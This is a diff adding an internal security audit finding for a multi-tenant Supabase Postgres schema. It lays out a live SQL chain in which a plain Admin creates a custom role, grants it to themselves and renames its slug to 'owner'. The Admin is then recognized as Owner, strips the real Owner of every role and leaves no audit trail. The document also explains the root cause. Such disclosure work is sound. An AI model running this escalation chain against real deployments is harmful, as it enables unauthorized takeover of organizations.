@@ -1,0 +1,107 @@
+Round 6 (sixth same-day Phase 2 professional-review audit) — NEW CRITICAL
+finding: privilege escalation via kontrolia_auth.roles, entirely outside
+memberships/membership_roles.
+
+Motivation: the round's brief asked to hunt for "any other role/permission
+table in the schema ... that could achieve equivalent privilege escalation
+outside memberships/membership_roles entirely." kontrolia_auth.roles itself
+is exactly that table — every last-owner/owner-grant guard added today
+(migrations 0025, 0028, 0029) determines "is this the Owner role?" purely by
+string comparison against roles.slug = 'owner', and none of them (nor any
+trigger anywhere) restrict what slug value a role row may hold. Meanwhile
+kontrolia_auth.roles carries its own ordinary "org admins can create/update
+custom roles" RLS policies (migration 0019) that check only organization
+ownership and is_system_role — never the slug value — and the table has ZERO
+triggers of any kind (confirmed live via information_schema.triggers,
+0 rows).
+
+Method: live SQL against the running local Supabase Postgres sandbox
+(container supabase_db_VACIO, port 54322), wrapped in BEGIN ... ROLLBACK,
+executed as a genuine RLS-authenticated session for a real plain Admin
+(ab44dde8-62fd-49a9-86ec-fed48dcb21ef, holds only 'admin' in org "CRM Demo"
+a742f84b-0b71-4064-a625-d90e493b25fb, which has the Faqturia application
+80c94485-d39e-4fc8-b12f-3c77f8492eea enabled — an entirely ordinary
+precondition, not a special setup).
+
+=== Confirmed precondition: zero triggers on kontrolia_auth.roles ===
+select event_object_table, trigger_name, action_timing, event_manipulation
+from information_schema.triggers where trigger_schema='kontrolia_auth'
+and event_object_table='roles';
+RESULT: (0 rows)
+
+=== STEP 1: create an innocuous custom app-scoped role in my own org ===
+insert into kontrolia_auth.roles (organization_id, application_id, name, slug, is_system_role)
+values ('a742f84b-...', '80c94485-...', 'Temp Role', 'temp-role-xyz', false)
+returning id, organization_id, slug, is_system_role;
+RESULT: 1 row inserted — ordinary, RLS-permitted admin action.
+
+=== STEP 2: grant myself that innocuous role via the ordinary membership_roles path ===
+insert into kontrolia_auth.membership_roles (membership_id, role_id)
+select 'b9b4541b-...' (my membership), id from kontrolia_auth.roles
+where organization_id='a742f84b-...' and slug='temp-role-xyz';
+RESULT: INSERT 0 1 -- succeeds (not an owner-slug grant, migration 0029's INSERT
+guard has nothing to say about a non-owner slug).
+Confirmed: kontrolia_auth.is_org_owner('a742f84b-...') still returns FALSE here.
+
+=== STEP 3: THE ACTUAL HOLE -- rename the already-granted role's slug to 'owner' ===
+update kontrolia_auth.roles set slug = 'owner'
+where organization_id='a742f84b-...' and slug='temp-role-xyz'
+returning id, organization_id, slug, is_system_role;
+RESULT: UPDATE 1 -- succeeds. membership_roles itself is never touched by this
+statement, so none of migrations 0025/0028/0029's triggers (which only fire on
+membership_roles INSERT/UPDATE/DELETE) can see it at all.
+
+=== STEP 4: am I now recognized as Owner? ===
+select kontrolia_auth.is_org_owner('a742f84b-...');
+RESULT: t  <-- PRIVILEGE ESCALATION CONFIRMED
+
+Follow-up join showing the exact row a UI/API would see:
+ slug  | is_system_role |           organization_id
+-------+----------------+--------------------------------------
+ admin | t              |
+ owner | f              | a742f84b-0b71-4064-a625-d90e493b25fb
+
+=== FULL-CHAIN TEST: does recognized-Owner status enable a complete takeover? ===
+Repeated steps 1-3 with a second temp role ('temp-role-abc'), then, still as
+attacker ab44dde8:
+delete from kontrolia_auth.membership_roles
+where membership_id = <REAL Owner 302d8127's row> and role_id = <global 'owner' role>;
+RESULT: DELETE 1 -- succeeds. Migration 0025's last-owner guard counted 2 active
+'owner'-slugged roles (the real one + the attacker's hijacked-slug fake one)
+before the delete, so its "count <= 1" check passed and let the real Owner's
+role be removed entirely.
+
+Follow-up: select r.slug from membership_roles mr join roles r ... where
+mr.membership_id = <real Owner's membership>; RESULT: 0 rows -- the real Owner
+has been fully, completely demoted, with zero roles left in the org.
+
+select kontrolia_auth.is_org_owner('a742f84b-...'); RESULT: t (attacker only)
+-- the attacker is now the ONLY membership is_org_owner() recognizes in this org.
+
+This is a complete, live-demonstrated organization takeover: a plain Admin,
+using only two entirely ordinary, individually-legitimate admin capabilities
+(create a custom app-scoped role for their own org; grant a non-owner role to
+themselves) plus one RLS-permitted UPDATE on a table (kontrolia_auth.roles)
+that no fix from today touches at all, ends the transaction as the org's sole
+recognized Owner, with the real Owner stripped of every role and zero audit
+trail (kontrolia_auth.log_role_assignment_change only logs INSERT/DELETE
+against role_id-as-inserted/deleted, and the roles.slug rename itself is never
+audit-logged by anything).
+
+Additional confirmation: attempting to INSERT a role row with slug='owner'
+directly (skipping the rename step) also succeeds under the same admin
+session -- the roles table's INSERT policy doesn't restrict slug either. The
+only reason the rename-after-grant sequence (not a direct owner-slug grant)
+is needed is that migration 0029's membership_roles INSERT guard checks the
+role's slug AT GRANT TIME -- renaming the role's own slug afterward, on a
+completely different table, is invisible to it.
+
+ROOT CAUSE: every "is this an Owner?" check in the schema (is_org_owner,
+is_org_admin, and all of 0025/0028/0029's guards) identifies the Owner role
+by string-matching roles.slug = 'owner', with no check that the row is the
+canonical, immutable system role (kontrolia_auth.roles where organization_id
+is null and is_system_role = true, seeded once in migration 0004). Any
+org-scoped custom role a plain Admin can create or already control can be
+relabeled into that same trusted string via kontrolia_auth.roles's own
+ordinary UPDATE policy, which was never in scope for any of today's five
+migrations because none of them touch the roles table at all.
